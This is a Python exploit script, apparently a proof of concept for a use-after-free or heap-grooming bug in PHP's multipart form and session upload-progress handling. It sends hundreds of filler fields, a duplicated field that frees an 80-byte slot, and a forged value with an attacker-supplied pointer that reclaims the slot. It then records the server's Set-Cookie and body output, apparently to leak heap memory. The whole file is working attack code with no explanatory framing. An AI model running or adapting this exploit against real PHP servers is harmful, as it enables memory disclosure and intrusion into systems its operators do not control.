#!/usr/bin/env python3
"""Duplicate-key page keeper:
 892 fillers -> field 'dup'(V0) at 80B-page slot0 -> P fillers (slots1..P)
 -> field 'dup'(V1) (new slot, frees V0/slot0) -> forge raw(80B) takes slot0
 -> M nested arrays (56B HashTables, no 80B allocations)
usage: b_htleak3.py M KEY LEAK [P]
"""
import socket,sys,struct
M=int(sys.argv[1]); KEY=int(sys.argv[2]); LEAK=int(sys.argv[3],0); P=int(sys.argv[4]) if len(sys.argv)>4 else 40
BND=b'B'*10
parts=[{'n':'PHPSESSID','d':b'attacksessionid0001'},{'n':'PHP_SESSION_UPLOAD_PROGRESS','d':b'pwn'}]
def filler(name,val): parts.append({'n':name,'d':val})
for i in range(892):
    filler(str(5000+i), (('v%04d'%i)+'x'*44).encode())
filler('dup', b'D0'+b'd'*46)          # 893rd 80B allocation: page slot0
for i in range(P):
    filler(str(6000+i), (('w%04d'%i)+'y'*44).encode())
filler('dup', b'D1'+b'e'*46)          # new live value; frees old slot0
v=bytearray(b'A'*79); struct.pack_into('<Q',v,0x10,LEAK); v[0x18:0x1a]=b'LZ'
filler('forge', bytes(v))             # raw 80B takes freed slot0
for i in range(M):
    filler('a%04d[%d]'%(i,KEY), b'x')
o=bytearray()
for p in parts:
    o+=b'--'+BND+b'\r\nContent-Disposition: form-data; name="'+p['n'].encode()+b'"\r\n\r\n'+p['d']+b'\r\n'
o+=b'--'+BND+b'--\r\n'
h=(f'POST /index.php HTTP/1.1\r\nHost: 127.0.0.1:8088\r\nContent-Type: multipart/form-data; boundary={BND.decode()}\r\nContent-Length: {len(o)}\r\nConnection: close\r\n\r\n').encode()
s=socket.create_connection(('127.0.0.1',8088),timeout=30); s.settimeout(30)
data=b''
try:
    s.sendall(h+bytes(o))
    while len(data)<32000000:
        c=s.recv(65536)
        if not c: break
        data+=c
except OSError as e: print('recv_err',repr(e))
s.close()
head,_,rest=data.partition(b'\r\n\r\n')
for line in head.split(b'\r\n'):
    if line.lower().startswith(b'set-cookie'):
        print('SETCOOKIE_LEN',len(line)); print('VALUE',line[:100].decode('latin1','replace'))
print('HEAD_LEN',len(head),'FIELDS',len(parts),'BODY',rest[:100].decode('latin1','replace'))
open('/tmp/b_htleak3.resp','wb').write(data)
